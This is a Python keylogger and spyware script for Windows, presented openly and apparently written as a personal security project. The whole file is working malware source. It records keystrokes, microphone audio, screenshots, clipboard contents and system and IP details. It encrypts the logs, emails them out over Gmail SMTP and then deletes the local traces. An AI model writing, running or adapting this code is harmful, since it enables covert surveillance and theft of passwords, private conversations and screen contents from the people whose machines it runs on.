# Libraries
#email
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import smtplib

#email credentials
import json

#collect info
import socket
import platform

#clipboard
import win32clipboard

#keyboard  
from pynput.keyboard import Key, Listener

import time
import os

#microphone capabilities
from scipy.io.wavfile import write
import sounddevice as sd

# crypto
from cryptography.fernet import Fernet

import getpass
from requests import get

# for screenshots
from multiprocessing import Process, freeze_support
from PIL import ImageGrab


# global var
file_path = "D:\\Security\\Python - Keylogger"
extend = "\\"
path = file_path + extend

# files created during the execution of the program
keys_information = "Key_adv_log.txt"
system_information = "system_info.txt"
clipboard_information = "clipboard.txt"
audio_information = "audio.wav"
screenshot_information = "screenshot.png"

keys_information_e = "e_Key_adv_log.txt"
system_information_e = "e_system_info.txt"
clipboard_information_e = "e_clipboard.txt"



# GETTING THE COMPUTER'S INFO

def computer_information():
    open(file_path + extend + system_information, "w" ).close()
    with open(file_path + extend + system_information, "a" ) as f:

        # netwrk info
        hostname = socket.gethostname()
        IPAddr = socket.gethostbyname(hostname)
        try:
            public_ip = get("https://api.ipify.org").text
            f.write("Public IP address: "+ public_ip + "\n")
        
        except Exception:
            f.write("Couldn't get Public IP \n")
        
        # processor & sys info
        f.write("Processor: " + (platform.processor()) + "\n")
        f.write("System: " + (platform.system()) + " "+ (platform.version()) +"\n")
        f.write("Machine: " + (platform.machine()) + "\n" )
        f.write("Hostname: " + hostname + "\n")
        f.write("Private IP: " + IPAddr + "\n")

computer_information()


# COPYING CLIPBOARD 

def copy_clipboard():
    open(file_path + extend + clipboard_information, "w").close()
    with open(file_path + extend + clipboard_information, "a") as f:

        # copying only the strings in clipboard
        try:
            win32clipboard.OpenClipboard()
            pasted_data = win32clipboard.GetClipboardData()
            win32clipboard.CloseClipboard()

            f.write("Clipboard Data: \n" + pasted_data)
        
        except:
            f.write("Clipboard cannot be copied")

#copy_clipboard()



# COLLECTING MICROPHONE INFO

sec = 10
def microphone():
    #sampling frequency
    fs = 44100

    # amount of time u want record
    seconds = sec

    myrecording = sd.rec(int(seconds * fs),samplerate = fs, channels = 2)
    sd.wait() # wait for it record

    write(file_path + extend + audio_information , fs, myrecording)

microphone()



# TAKING SCREENSHOT

def screenshot():
    im = ImageGrab.grab()
    im.save(file_path + extend + screenshot_information)

#screenshot()



# EMAIL FUNCTIONALITY --> Send all the acquired info

cred = open('credentials.json','r')
data = json.load(cred)

email_address = data["email"]
password = data["password"]

toaddr = email_address

def send_mail(filename, attachment, toaddr):
    fromaddr = email_address

    msg = MIMEMultipart()
    msg['From'] = fromaddr
    msg ['To'] = toaddr
    msg['Subject'] = "Log file"

    body = "Body_of_the_mail"

    msg.attach(MIMEText(body,'plain'))

    #attachment
    filename = filename
    attachment = open(attachment,'rb') # file is read in binary format

    p = MIMEBase('application','octet-stream')

    p.set_payload((attachment).read())
    encoders.encode_base64(p)

    p.add_header('Content-Disposition',"attachment; filename = %s" % filename)
    msg.attach(p)
    
    # creating an email session
    s = smtplib.SMTP('smtp.gmail.com',587)
    s.starttls()
    s.login(fromaddr,password)

    text = msg.as_string()

    s.sendmail(fromaddr, toaddr, text)

    s.quit()

#send_mail(keys_information, file_path + extend + keys_information, toaddr)



# BASIC KEYLOGGER

count = 0
keys = []

times_iteration = 15 # taking key log for 15 seconds
number_of_iterations = 0
currentTime = time.time()
stoppingTime = time.time() + times_iteration
number_of_iterations_end = 1 #Take key log for 15 seconds this many times

while number_of_iterations < number_of_iterations_end:

    def on_press(key):
        global keys, count, currentTime

    # print(key)
        keys.append(key)
        count = count + 1
        currentTime = time.time() # at every key press --> currentTime is updated

        if(count >= 1):
            count = 0
            write_file(keys)
            keys = []

    def write_file(keys):
        #open(file_path + extend + keys_information,"w").close() # clears the file
        with open(file_path + extend + keys_information,"a") as f:
            for key in keys:
                k = str(key).replace("'","")
                if k.find("space") > 0:
                    f.write(' ')
                
                elif k.find("enter") > 0:
                    f.write('\n')

                elif k.find("Key") == -1:
                    f.write(k)

                f.close()    

    def on_release(key):
        if key == Key.esc:
            return False
        if currentTime > stoppingTime:
            return False

    with Listener(on_press = on_press, on_release = on_release) as listener:
        listener.join()

    if currentTime > stoppingTime:
        # clear log 
        open(file_path + extend + keys_information,"w").close()

        screenshot()
        send_mail(screenshot_information, file_path + extend + screenshot_information, toaddr)

        copy_clipboard()

        number_of_iterations += 1
        #stoppingTime = time.time() + times_iteration    



# ENCRYPTION 
files_to_encrypt = [path + system_information, path + clipboard_information, path + keys_information]
enc_filenames = [path + system_information_e, path + clipboard_information_e, path + keys_information_e]

enc_key = 'Generate a key from GenerateKey.py and place it here'
count = 0
for encrypting_file in files_to_encrypt:
    # encrypyting with key

    with open(files_to_encrypt[count], 'rb') as f:
        data = f.read()
    
    fernet = Fernet(enc_key)
    encrypted = fernet.encrypt(data)

    with open(enc_filenames[count], 'wb') as f:
        f.write(encrypted)
    
    send_mail(enc_filenames[count],enc_filenames[count], toaddr)
    count += 1

time.sleep(120) # time for sending mail

delete_files = [system_information, clipboard_information, keys_information, screenshot_information, audio_information]
for file in delete_files:
    os.remove(path + file)       






        

        